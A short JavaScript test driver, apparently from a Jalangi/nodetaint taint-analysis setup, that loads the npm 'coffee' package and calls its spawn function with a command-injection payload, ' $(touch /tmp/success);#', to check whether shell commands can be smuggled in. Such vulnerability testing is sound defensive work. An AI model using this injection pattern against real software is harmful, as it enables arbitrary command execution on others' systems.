// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/coffee/node_modules/coffee');
try {
	var x0 = {};
var x1 = {};
var x2 = {"cmd":{"cmd":" $(touch /tmp/success);#"}};
new PUT["spawn"](x0,x1,x2)();
} catch (e) {
	console.log(e);
}